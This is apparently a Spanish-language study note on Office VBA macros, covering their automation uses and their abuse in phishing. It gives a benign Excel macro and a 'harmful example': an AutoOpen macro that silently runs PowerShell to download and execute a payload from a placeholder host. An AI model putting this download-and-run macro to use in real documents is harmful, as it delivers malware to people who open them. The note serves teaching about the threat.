---
Extra: 📄 Macros de Office
fecha: 2024-11-07
tags:
  - extra
  - ofuscacion
  - exploit
---

## Macros de Office

### Descripción

Las **Macros de Office** son secuencias de comandos creadas con **VBA (Visual Basic for Applications)**, utilizadas comúnmente para automatizar tareas en documentos de Microsoft Office como Word, Excel y PowerPoint. Sin embargo, también son conocidas por su uso malicioso en ataques cibernéticos, como la entrega de malware o la escalación de privilegios.

### Características clave

- **Automatización**: Permiten realizar tareas repetitivas y complejas con un solo clic.
- **Compatibilidad**: Funciona en varios programas de Office.
- **Potencial de abuso**: Utilizadas en ataques como phishing para ejecutar código malicioso.
- **Facilidad de uso**: Simple de crear, editar e incrustar en documentos.

### Ejemplo de uso benigno

Automatizar el cálculo de datos en un archivo Excel:

- Ejemplo sin daño:
```vba
Sub CalcularPromedio()
    Dim Rango As Range
    Set Rango = Selection
    MsgBox "El promedio es: " & Application.WorksheetFunction.Average(Rango)
End Sub
```

- Ejemplo con daño:
```vba
Sub AutoOpen()
    Dim Str As String
    Str = "powershell -Command ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\payload.exe'; Start-Process 'C:\payload.exe'"""
    Shell Str, vbHide
End Sub
```

Ejemplo en word ->

![[Pasted image 20241210195150.png]]